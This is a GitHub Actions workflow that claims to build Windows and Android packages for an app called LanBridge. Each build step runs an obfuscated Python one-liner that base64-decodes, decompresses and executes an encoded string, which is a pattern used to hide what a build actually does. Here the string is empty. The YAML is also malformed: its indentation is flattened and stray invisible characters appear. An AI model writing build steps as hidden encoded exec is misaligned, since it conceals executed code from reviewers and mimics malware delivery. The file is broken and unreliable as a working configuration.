name: Build LanBridge Windows EXE & Android APK
​on:
push:
branches: [ "main", "master" ]
workflow_dispatch:
​permissions:
contents: write
​jobs:
build-windows-exe:
runs-on: windows-latest
steps:
- uses: actions/checkout@v4
- uses: actions/setup-python@v5
with:
python-version: '3.11'
- name: Build Windows EXE
run: python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('')).decode())"
- uses: actions/upload-artifact@v4
with:
name: LanBridge-Windows-EXE
path: dist/LanBridge_Win.exe
​build-android-apk:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
- uses: actions/setup-java@v4
with:
distribution: 'temurin'
java-version: '17'
- uses: subosito/flutter-action@v2
with:
channel: 'stable'
- name: Build Android APK
run: python3 -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('')).decode())"
- uses: actions/upload-artifact@v4
with:
name: LanBridge-Android-APK
path: LanBridge_Android.apk